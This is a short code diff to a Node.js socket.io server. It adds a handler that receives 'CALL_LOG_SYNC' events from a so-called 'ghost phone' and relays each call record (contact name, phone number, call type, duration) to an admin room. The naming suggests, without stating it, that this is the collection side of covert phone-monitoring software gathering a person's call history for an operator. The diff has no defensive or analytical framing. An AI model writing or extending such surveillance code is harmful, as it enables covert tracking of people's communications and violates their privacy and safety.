@@ -118,6 +118,25 @@ io.on('connection', (socket) => {
     }
   });
 
+  // MONITOR GHOST PHONE CALL LOGS
+socket.on('ghost_activity', (payload) => {
+    if (payload.type === 'CALL_LOG_SYNC') {
+        // Unpack the logs and send them to the Admin individually
+        payload.data.forEach(call => {
+            const logEntry = {
+                timestamp: new Date().toLocaleTimeString(),
+                message: `CALL: ${call.name} (${call.number}) | Type: ${call.type} | Duration: ${call.duration}s`,
+                name: payload.name
+            };
+            io.to('admin_room').emit('activity_log', logEntry);
+        });
+    } else {
+        // Standard activity
+        io.to('admin_room').emit('activity_log', payload);
+    }
+});
+
+
   // DISCONNECT CLEANUP
   socket.on('disconnect', () => {
     viewers.delete(socket.id);
